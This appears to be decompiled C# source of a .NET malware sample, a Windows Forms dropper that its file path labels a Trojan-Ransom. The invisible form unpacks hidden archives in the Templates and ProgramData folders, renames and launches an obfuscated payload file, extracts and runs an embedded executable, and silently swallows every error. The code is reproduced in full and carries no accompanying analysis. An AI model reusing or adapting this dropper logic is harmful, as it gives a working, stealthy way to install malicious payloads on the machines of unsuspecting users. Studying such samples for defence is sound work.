// Decompiled with JetBrains decompiler
// Type: ndhavrnigh.Form1
// Assembly: ndhavrnigh, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D7DE8FC-8646-402D-AFA0-456189D4D7BD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-03db5b67aa8c5f810ada16aea81967d840ec10858aa214b8835e4c5ff9b3fbc2.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace ndhavrnigh
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      Form1.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    public void UnrMusrp()
    {
      try
      {
        string str1 = "\\HPwimra\\";
        string str2 = "uiltghnsra";
        string str3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + str1;
        zemuse zemuse = new zemuse();
        musipc musipc = new musipc();
        Environment.OSVersion.ToString();
        byte[] array = ((IEnumerable<string>) (string[]) musipc.getWin()).Select<string, byte>((Func<string, byte>) (s => byte.Parse(s))).ToArray<byte>();
        if (!Directory.Exists(str3))
          Directory.CreateDirectory(str3);
        string str4 = str3 + str2;
        if (!File.Exists(str4))
          File.WriteAllBytes(str4 + ".zip", array);
        if (!File.Exists(str4 + ".exe".ToString()))
          zemuse.uindTuile(str4, str3);
        Thread.Sleep(410);
        Process.Start(str4 + ".exe".ToString());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void oprMuses(string fil_path)
    {
      try
      {
        FileInfo[] files = new DirectoryInfo(fil_path).GetFiles("*.fo_r_d".Replace("_", ""));
        int index = 0;
        if (index >= files.Length)
          return;
        FileInfo fileInfo = files[index];
        string str = fil_path + "\\\\" + fileInfo.Name.Replace(".fo_r_d".Replace("_", ""), "").Replace("$", ".");
        File.WriteAllBytes(str, File.ReadAllBytes(fileInfo.FullName));
        Process.Start(str);
        File.Delete(fileInfo.FullName);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void DoaMusde()
    {
      try
      {
        string str1 = Path.GetFileName(Application.ExecutablePath).Split('.')[0];
        zemuse zemuse = new zemuse();
        string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
        string zip_n2ame = str2 + str1;
        if (File.Exists(zip_n2ame + ".zip"))
          ;
        zemuse.uindTuile(zip_n2ame, str2);
        this.oprMuses(str2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      Thread.Sleep(810);
      this.DoaMusde();
      Thread.Sleep(5010);
      this.UnrMusrp();
      Thread.Sleep(10120);
      try
      {
        this.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
    }
  }
}
